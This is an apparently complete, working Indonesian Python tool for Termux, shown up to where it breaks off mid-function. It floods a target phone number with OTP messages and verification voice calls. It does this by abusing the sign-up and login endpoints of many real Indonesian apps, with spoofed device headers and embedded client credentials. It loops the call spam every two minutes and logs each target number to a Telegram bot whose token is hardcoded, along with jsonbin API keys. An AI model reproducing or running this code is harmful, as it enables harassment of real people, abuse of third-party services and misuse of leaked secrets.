#!/usr/bin/env python3

import os
import sys
import json
import signal
import smtplib
import re
import getpass
import random
import time
from bs4 import BeautifulSoup
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from datetime import datetime
import requests
import urllib3
from wcwidth import wcswidth
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import string
import uuid
import time
import phonenumbers
from phonenumbers import geocoder, carrier, timezone, PhoneNumberType, NumberParseException

a = "\033[1;30m"
m = "\033[1;31m"
h = "\033[1;32m"
k = "\033[1;33m"
c = "\033[1;36m"
p = "\033[1;37m"
r = "\033[0m"

apikeyleaderboard_bin = "$2a$10$JHRavxogD1yevfQw9rcLE.7XHZKn5j9QZINBy2NT3coqkxLyObAyK"
apikey_bin = "$2a$10$saL27u16DWiww4cQjDMOF.xcpHw9T75AaKRkdlfwmNxKB5kyZkp.q"
bin_id = "6a0d71d76877513b27a0e209"
url_bin = f"https://api.jsonbin.io/v3/b/{bin_id}/latest"

RAW_USER_DB = "https://raw.githubusercontent.com/AjJwnskanKanskNwndbdoaOsmxmaBdqkNwknaa/XdbSpmPrm/refs/heads/main/user.json"

BIN_ID_PESAN = "6a0d72f8ee5a733b12ec1ffd"
BASE_URL_SET_PESAN = f"https://api.jsonbin.io/v3/b/{BIN_ID_PESAN}"
MAX_CHAR = 58
ALLOWED_DEVICE_ID = "4cae7b5893094f10f2d7"
sesi_file = f"{os.path.expanduser('~')}/.nexus.lock"
SESSION_FILE = "/data/data/com.termux/files/home/.otp_session.json"
SESSION_FILE_TELP = "/data/data/com.termux/files/home/.telp_session.json"

TIPE_NOMOR = {
    PhoneNumberType.MOBILE              : "Mobile",
    PhoneNumberType.FIXED_LINE          : "Landline / Fixed Line",
    PhoneNumberType.FIXED_LINE_OR_MOBILE: "Mobile atau Landline",
    PhoneNumberType.TOLL_FREE           : "Toll Free",
    PhoneNumberType.PREMIUM_RATE        : "Premium Rate",
    PhoneNumberType.SHARED_COST         : "Shared Cost",
    PhoneNumberType.VOIP                : "VoIP",
    PhoneNumberType.PERSONAL_NUMBER     : "Personal Number",
    PhoneNumberType.PAGER               : "Pager",
    PhoneNumberType.UAN                 : "UAN (Universal Access Number)",
    PhoneNumberType.VOICEMAIL           : "Voicemail",
    PhoneNumberType.UNKNOWN             : "Tidak Diketahui",
}

deviceid = ""
nama = ""
tanggal = ""
ipaddress = ""
merekhp = ""
os_hp = ""
cpu = ""
memory = ""
jumlah_user_cache = 0

LOG_BOT_TOKEN = "8095010207:AAG0A2dlV0E6T8uoU6LF1LxsMMnrB7Nk5u0"
LOG_CHAT_ID = "7835697069"

BIN_ID_LEADERBOARD = "6a0d772dee5a733b12ec3a62"
URL_BIN_LEADERBOARD = f"https://api.jsonbin.io/v3/b/{BIN_ID_LEADERBOARD}/latest"
BIN_ID_PESAN = "6a0d72f8ee5a733b12ec1ffd"
URL_BIN_PESAN = f"https://api.jsonbin.io/v3/b/{BIN_ID_PESAN}/latest"

def ambil_databinpesan():
    try:
        resp = requests.get(BASE_URL_SET_PESAN, headers={"X-Master-Key": apikey_bin, "Content-Type": "application/json"}, timeout=10)
        resp.raise_for_status()
        return resp.json()["record"]
    except Exception as e:
        input(f"  {p}[{m}!{p}] Gagal mengambil data bin: {e} {m}| {h}ENTER")
        return None

def update_pesan_bin(data, line_num):
    try:
        resp = requests.put(BASE_URL_SET_PESAN, json=data, headers={"X-Master-Key": apikey_bin, "Content-Type": "application/json"}, timeout=10)
        resp.raise_for_status()
        hasil = resp.json()
        if hasil.get("metadata", {}).get("id") or "record" in hasil:
            return True, None
        return False, "Respons tidak dikenali dari server."
    except requests.exceptions.HTTPError as e:
        try:
            detail = resp.json().get("message", str(e))
        except Exception:
            detail = str(e)
        return False, detail
    except Exception as e:
        return False, str(e)

def set_pesan_main():
    if deviceid != ALLOWED_DEVICE_ID:
        input(f"\n  {p}[{m}!{p}] Minggir Dasar Rakyat Jelata! {m}|{h} ENTER")
        return

    while True:
        print(f"""
{a}╭─────────────────────────────────────────────────────────────╮
│{p} Masukkan Pilihan Untuk Update Pesan Line {h}1{p} Atau Line {h}2{p} BIN  {a}│
╰── ╭─ {m}[ {p}L I N E{m} ]{a} ───────────────────────────────────────────╯""")
        pilihan = input(f"    {a}╰──{h}➤{p} ").strip()

        if pilihan == "":
            break

        if pilihan not in ("1", "2"):
            input(f"  {p}[{m}!{p}] Pilihan Tidak Valid{m} | {h}ENTER")
            continue

        line_key = f"line{pilihan}"
        line_num = pilihan

        data = ambil_databinpesan()
        if data is None:
            input(f"  {p}[{h}+{p}] Kembali Ke Menu {m}|{h} ENTER")
            continue

        current_val = data.get("pesan", {}).get(line_key, "")
        lebar_teks = wcswidth(current_val)
        jarak_line = " " * max(0, 59 - lebar_teks)

        print(f"""
{a}╭───────────────────────── {m}[{p} LINE {h}{line_num}{m} ]{a} ────────────────────────╮
{a}│{p} {current_val}{jarak_line} {a}│
{a}╰─────────────────────────────────────────────────────────────╯""")

        new_val = input(f"""
{a}╭────────────────────────────╮
│{p} Edit Isi Pesan Pada Line {h}{pilihan} {a}│
╰── ╭─ {m}[{p} E D I T {m}]{a} ──────────╯
    {a}╰──{h}➤{p} """)

        if len(new_val) > MAX_CHAR:
            input(f"\n  {p}[{m}!{p}] Terlalu panjang! {m}|{h} ENTER")
            continue

        confirm = input(f"\n  {p}[{h}+{p}] Silahkan Ketik {h}Y{p} Untuk Confirm atau {h}N{p} Untuk Batal :{p} ").strip().upper()

        if confirm != "Y":
            input(f"  {p}[{m}~{p}] Dibatalkan {m}|{h} ENTER")
            continue

        if "pesan" not in data:
            data["pesan"] = {"line1": "", "line2": ""}
        data["pesan"][line_key] = new_val

        success, error = update_pesan_bin(data, line_num)

        if success:
            input(f"\n  {p}[{h}+{p}] Update Line {h}{line_num} {p}Berhasil {m}|{h} ENTER")
        else:
            input(f"\n  {p}[{m}!{p}] Update Line{h} {line_num} {p}Gagal")
            input(f"  {p}[{m}!{p}] Alasan {m}:{p} {error} {m}|{h} ENTER")

def get_leaderboard():
    try:
        headers = {"X-Master-Key": apikeyleaderboard_bin, "X-Bin-Meta": "false"}
        resp = requests.get(URL_BIN_LEADERBOARD, headers=headers, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("leaderboard", [])
        return []
    except:
        return []

def update_leaderboard(fitur):
    try:
        hari_ini = datetime.now().strftime("%d-%m-%Y")
        headers = {
            "X-Master-Key": apikeyleaderboard_bin,
            "X-Bin-Meta": "false"
        }
        data = get_leaderboard()

        user_found = False
        for user in data:
            if user.get("device_id") == deviceid and user.get("tanggal") == hari_ini:
                user["total"] += 1
                if fitur not in user["fitur"]:
                    user["fitur"].append(fitur)
                user_found = True
                break

        if not user_found:
            data.append({
                "device_id": deviceid,
                "nama": nama,
                "total": 1,
                "fitur": [fitur],
                "tanggal": hari_ini
            })

        data = [u for u in data if u.get("tanggal") == hari_ini]
        data.sort(key=lambda x: x["total"], reverse=True)

        requests.put(
            f"https://api.jsonbin.io/v3/b/{BIN_ID_LEADERBOARD}",
            json={"leaderboard": data},
            headers={
                "X-Master-Key": apikeyleaderboard_bin,
                "Content-Type": "application/json"
            },
            timeout=10
        )
    except:
        pass

def tampilkan_leaderboard():
    data = get_leaderboard()
    hari_ini = datetime.now().strftime("%d-%m-%Y")
    data = [u for u in data if u.get("tanggal") == hari_ini]
    data.sort(key=lambda x: x["total"], reverse=True)
    h_cursor()
    print(f"\n{a}╭───────────────── {m}[{p} L E A D E R B O A R D {m}] {a}─────────────────╮")

    if not data:
        print(f"{a}│{p}                Belum ada aktivitas hari ini.                {a}│")
    else:
        for i, user in enumerate(data[:10]):
            nama_user = user.get("nama", "Unknown")
            total = user.get("total", 0)
      
            nomor = str(i + 1).zfill(2)
  
            jarak_unama = " " * max(0, 22 - wcswidth(str(nama_user)))
            jarak_total = " " * max(0, 4 - wcswidth(str(total)))
  
            teks = f" {p}{nomor}{m}.{h} {nama_user}{jarak_unama} {m}—           {h}Point Pengguna{m}:{p} {total}{jarak_total}"
            print(f"{a}│ {teks}{a}│")

    print(f"{a}╰─────────────────────────────────────────────────────────────╯{r}")
    input(f"""{a}╭─────────────────────────────────────────────────────────────╮
│ \033[101m     {r}{h}          >> {p}ENTER FOR BACK TO MENU{h} <<           \033[101m     {r} {a}│
╰─────────────────────────────────────────────────────────────╯
""")
    s_cursor()
    
def get_pesan_banner():
    try:
        headers = {
            "X-Master-Key": apikey_bin,
            "X-Bin-Meta": "false"
        }
        response = requests.get(URL_BIN_PESAN, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            pesan = data.get("pesan", {})
            line1 = pesan.get("line1", "").replace("{nama}", nama).replace("{deviceid}", deviceid)
            line2 = pesan.get("line2", "").replace("{nama}", nama).replace("{deviceid}", deviceid)
            return line1, line2
        return "", ""
    except:
        return "", ""

def h_cursor():
    print("\033[?25l", end="")

def s_cursor():
    print("\033[?25h", end="")

def kirim_log_aktivitas(fitur, target):
    try:
        tanggal_log = datetime.now().strftime("%d - %m - %Y %H:%M")
        pesan = (
            f"""🚨 𝐀𝐊𝐓𝐈𝐕𝐈𝐓𝐀𝐒 𝐓𝐄𝐑𝐃𝐄𝐓𝐄𝐊𝐒𝐈 🚨

𝗜𝗗 𝗧𝗲𝗿𝗺𝘂𝘅
```
{deviceid}
```

𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲
```
{nama}
```

𝗙𝗶𝘁𝘂𝗿
```
{fitur}
```

𝗧𝗮𝗿𝗴𝗲𝘁
```
{target}
```

𝗧𝗮𝗻𝗴𝗴𝗮𝗹
```
{tanggal_log}
```
"""
        )
        requests.post(
            f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": LOG_CHAT_ID,
                "text": pesan,
                "parse_mode": "Markdown"
            },
            timeout=5
        )
    except:
        pass
        
def input_dengan_timeout(prompt, timeout=20):
    import threading
    hasil = [None]
    selesai = threading.Event()

    def ambil_input():
        try:
            hasil[0] = input(prompt)
        except:
            hasil[0] = ""
        selesai.set()

    t = threading.Thread(target=ambil_input, daemon=True)
    t.start()
    selesai.wait(timeout)

    if not selesai.is_set():
        return ""

    return hasil[0].strip() if hasil[0] else ""

def spam_otp_codex(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def spam_otp_nilai(response, start, end):
    try:
        idx = response.find(start)
        if idx == -1:
            return None
        idx += len(start)
        tail = response[idx:]
        end_idx = tail.find(end)
        if end_idx == -1:
            return None
        return tail[:end_idx]
    except:
        return None
        
def telp_spam_uku(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor
        imei = ''.join(random.choices('abcdef0123456789', k=32))
        headers = {
            "Host": "gateway.ukuindo.com",
            "Accept": "application/json",
            "Appsflyerid": "1739206918799-3547019681597550358",
            "Device": "ANDROID",
            "Distinctid": "undefined",
            "Imei": imei,
            "Version": "6092201",
            "Versioncode": "6.9.22",
            "Accept-Language": "id_ID",
            "Adid": "",
            "Channel": "GooglePlay",
            "Product": "uku",
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.2"
        }
        payload = {
            "phone": nomor_lokal,
            "smsType": "VOICE_SMS",
            "channel": "GooglePlay",
            "appInstanceId": ""
        }
        resp = requests.post("https://gateway.ukuindo.com/entrance/v3/getcode", json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def telp_spam_speedcash(nomor):
    try:
        res_tok = requests.post(
            "https://sofia.bmsecure.id/central-api/oauth/token",
            data="grant_type=client_credentials",
            headers={
                "Authorization": "Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=10
        )
        token = spam_otp_nilai(res_tok.text, 'access_token":"', '","')
        if not token:
            return False
        uuid = spam_otp_codex(8)
        resp = requests.post(
            "https://sofia.bmsecure.id/central-api/sc-api/otp/generate",
            json={
                "version_name": "6.2.1 (428)",
                "phone": nomor,
                "appid": "SPEEDCASH",
                "version_code": 428,
                "location": "0,0",
                "state": "REGISTER",
                "type": "VOICE",
                "app_id": "SPEEDCASH",
                "uuid": f"00000000-4c22-250d-ffff-ffff{uuid}",
                "via": "BB ANDROID"
            },
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
            timeout=10
        )
        return spam_otp_nilai(resp.text, '"rc":"', '","') == "00"
    except:
        return False

def telp_spam_jogjakita(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]
        session = requests.Session()
        auth_resp = session.post(
            "https://aci-user.bmsecure.id/oauth/token",
            data={
                "grant_type": "client_credentials",
                "uuid": "00000000-0000-0000-0000-000000000000",
                "id_user": "0", "id_kota": "0",
                "location": "0.0,0.0",
                "via": "jogjakita_user",
                "version_code": "501",
                "version_name": "6.10.1"
            },
            headers={
                "authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "okhttp/4.10.0"
            },
            timeout=10
        )
        token = auth_resp.json().get("access_token")
        if not token:
            return False
        resp = session.post(
            "https://aci-user.bmsecure.id/v2/user/signin-otp/voice/send",
            json={
                "phone_user": nomor,
                "primary_credential": {
                    "device_id": "", "fcm_token": "",
                    "id_kota": 0, "id_user": 0,
                    "location": "0.0,0.0", "uuid": "",
                    "version_code": "501", "version_name": "6.10.1",
                    "via": "jogjakita_user"
                },
                "uuid": "00000000-4c22-250d-3006-9a465f072739",
                "version_code": "501", "version_name": "6.10.1",
                "via": "jogjakita_user"
            },
            headers={"Content-Type": "application/json; charset=UTF-8", "Authorization": f"Bearer {token}"},
            timeout=10
        )
        return resp.json().get("rc") == 200
    except:
        return False

def simpan_sesi_telp(nomor, waktu_kirim):
    try:
        with open(SESSION_FILE_TELP, "w") as f:
            json.dump({"nomor": nomor, "waktu_kirim": waktu_kirim}, f)
    except:
        pass

def baca_sesi_telp():
    try:
        with open(SESSION_FILE_TELP, "r") as f:
            return json.load(f)
    except:
        return None

def hapus_sesi_telp():
    try:
        os.remove(SESSION_FILE_TELP)
    except:
        pass

def mulai_spam_telp(nomor):
    apis = {
        "uku"       : telp_spam_uku,
        "speedcash" : telp_spam_speedcash,
        "jogjakita" : telp_spam_jogjakita,
    }
    with ThreadPoolExecutor(max_workers=len(apis)) as executor:
        futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass

def spam_telp_main():
    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│{p} Masukkan Nomor Target Format Nasional. Contoh{m}: {h}08×××××××××× {a}│
╰── ╭─ {m}[{p} N O M O R{m} ]{a} ─────────────────────────────────────────╯""")

    nomor = input(f"    {a}╰──{h}➤{p} ").strip()
    print()

    if not nomor:
        input(f"{p} [{m}!{p}] Nomor tidak boleh kosong!{p} {m}|{h} ENTER{r}")
        return

    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif nomor.startswith("+62"):
        nomor = nomor[1:]
    elif nomor.startswith("62"):
        pass
    else:
        nomor = "62" + nomor
        
    update_leaderboard(5)
    kirim_log_aktivitas("5 - Spam Telepon", nomor)

    try:
        sesi = baca_sesi_telp()
        if sesi and sesi.get("nomor") == nomor:
            waktu_kirim = sesi.get("waktu_kirim")
            sisa = 120 - int(time.time() - waktu_kirim)
            if sisa > 0:
                spam_countdown(waktu_kirim, 120)

        while True:
            mulai_spam_telp(nomor)
            waktu_kirim = time.time()
            simpan_sesi_telp(nomor, waktu_kirim)
            spam_countdown(waktu_kirim, 120)
            hapus_sesi_telp()

    except KeyboardInterrupt:
        sys.stdout.write("\n\n\n\n")
        print(f"\n{p} [{h}+{p}] Kembali Ke Menu Spammer{r}")
        time.sleep(1)
        return

def spam_otp_bisatopup(nomor):
    try:
        dev = spam_otp_codex(16)
        url = f"https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={dev}&version_name=6.12.04&version=61204"
        payload = f"phone_number={nomor}"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        res = requests.post(url, data=payload, headers=headers, timeout=10)
        return spam_otp_nilai(res.text, '"message":"', '","') == "OTP akan segera dikirim ke perangkat"
    except:
        return False

def spam_otp_speedcash(nomor):
    try:
        url_token = "https://sofia.bmsecure.id/central-api/oauth/token"
        headers_token = {
            "Authorization": "Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        res_tok = requests.post(url_token, data="grant_type=client_credentials", headers=headers_token, timeout=10)
        token = spam_otp_nilai(res_tok.text, 'access_token":"', '","')
        if not token:
            return False
        
        uuid = spam_otp_codex(8)
        url_otp = "https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
        payload = {
            "version_name": "6.2.1 (428)",
            "phone": nomor,
            "appid": "SPEEDCASH",
            "version_code": 428,
            "location": "0,0",
            "state": "REGISTER",
            "type": "WA",
            "app_id": "SPEEDCASH",
            "uuid": f"00000000-4c22-250d-ffff-ffff{uuid}",
            "via": "BB ANDROID"
        }
        headers_otp = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        res = requests.post(url_otp, json=payload, headers=headers_otp, timeout=10)
        return spam_otp_nilai(res.text, '"rc":"', '","') == "00"
    except:
        return False

def spam_otp_singa(nomor):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
        payload = {"mobile_phone": nomor, "type": "mobile", "is_switchable": 1}
        headers = {"Content-Type": "application/json; charset=utf-8"}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(res.text, '"msg":"', '","') == "Success"
    except:
        return False

def spam_otp_ktakilat(nomor):
    try:
        url = "https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"
        payload = {"mobileNo": nomor, "smsType": 1}
        headers = {
            "Content-Type": "application/json; charset=UTF-8",
            "Device-Info": "eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0="
        }
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(res.text, '"msg":"', '","') == "success"
    except:
        return False

def spam_otp_uangme(nomor):
    try:
        aid = f"gaid_15497a9b-2669-42cf-ad10-{spam_otp_codex(12)}"
        url = f"https://api.uangme.com/api/v2/sms_code?phone={nomor}&scene_type=login&send_type=wp"
        headers = {
            "aid": aid,
            "android_id": "b787045b140c631f",
            "app_version": "300504",
            "brand": "samsung",
            "carrier": "00",
            "Content-Type": "application/x-www-form-urlencoded",
            "country": "510",
            "dfp": "6F95F26E1EEBEC8A1FE4BE741D826AB0",
            "fcm_reg_id": "frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo",
            "gaid": "gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0",
            "lan": "in_ID",
            "model": "SM-G965N",
            "ns": "wifi",
            "os": "1",
            "timestamp": "1732178536",
            "tz": "Asia%2FBangkok",
            "User-Agent": "okhttp/3.12.1",
            "v": "1",
            "version": "28"
        }
        res = requests.get(url, headers=headers, timeout=10)
        return spam_otp_nilai(res.text, '{"code":"', '","') == "200"
    except:
        return False

def spam_otp_adiraku(nomor):
    try:
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        payload = {"mobileNumber": nomor, "type": "prospect-create", "channel": "whatsapp"}
        headers = {"Content-Type": "application/json; charset=utf-8"}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(res.text, '{"message":"', '","') == "success"
    except:
        return False
        
def spam_otp_tokopedia(nomor):
    try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
    except:
        return False
        
def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = nomor
        username = "0" + nomor[3:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username
        
def spam_otp_duniagames(nomor):
    try:
        phone, username = format_nomor(nomor)
        session = requests.Session()
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "ciam-type": "FR",
            "content-type": "application/json",
            "origin": "https://duniagames.co.id",
            "referer": "https://duniagames.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-device": "1ee352b7-d541-418f-a7b9-82d9358ea6a4"
        }
        payload = {
            "phoneNumber": phone,
            "userName": username
        }
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
import requests

def spam_otp_acc(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        
        url = "https://www.acc.co.id/register/new-account"
        
        headers = {
            "Accept": "text/x-component",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "text/plain;charset=UTF-8",
            "Host": "www.acc.co.id",
            "next-action": "7f4271400eb36624563cc4172891e0c821039f2fca",
            "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%5D%7D%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%2Cnull%2Ctrue%5D",
            "Origin": "https://www.acc.co.id",
            "Referer": "https://www.acc.co.id/register/new-account",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        payload = f'[{{"user_id":null,"action":"register","send_to":"{nomor_lokal}","provider":"whatsapp"}}]'
        
        resp = session.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_liva(nomor):
    try:
        if not nomor.startswith("62"):
            nomor = "62" + nomor.lstrip("0")

        session = requests.Session()

        url = "https://cms-2f7gt694.liva-auto.id/api/public/auth-ada/send-otp"

        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "no-store",
            "content-type": "application/json",
            "origin": "https://liva-auto.id",
            "referer": "https://liva-auto.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-app-version": "1.9.259",
            "x-device-id": "",
            "x-device-name": "",
            "x-platform": "web",
        }

        payload = {
            "phoneNumber": nomor,
            "otp": "TT:by_exe9"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_planetban(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()
        url = "https://api.planetban.com/website/customer/request-otp"

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://planetban.com",
            "referer": "https://planetban.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        payload = {
            "phone": nomor,
            "purpose": "register",
            "method": "whatsapp"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_rumah123(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        ua_url = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
        ua_list = requests.get(ua_url, timeout=10).text.strip().split("\n")
        ua = random.choice(ua_list)

        session = requests.Session()
        url = "https://www.rumah123.com/api/otp/request-otp"

        headers = {
            "User-Agent": ua,
            "sec-ch-ua-platform": '"Windows"',
            "Referer": "https://www.rumah123.com/user/login",
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            "sec-ch-ua-mobile": "?0",
            "baggage": "sentry-environment=production,sentry-release=99-core-api%401.0.0,sentry-public_key=50dec5eb30e19517693eb88cec8c3d07,sentry-trace_id=5368e13ab971475eb79b18f53bda3124",
            "sentry-trace": "5368e13ab971475eb79b18f53bda3124-bd2b5a8fe7ed22fd-0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "Base-Url-Core": "https://www.rumah123.com",
        }

        payload = {
            "cancelledRequestId": "",
            "phoneNumber": f"62{nomor}",
            "portalId": 1,
            "type": "WHATSAPP"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10, verify=False)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_paperid(nomor):
    try:
        if nomor.startswith("62"):
            nomor_format = nomor
        elif nomor.startswith("0"):
            nomor_format = "62" + nomor[1:]
        else:
            nomor_format = nomor

        session = requests.Session()
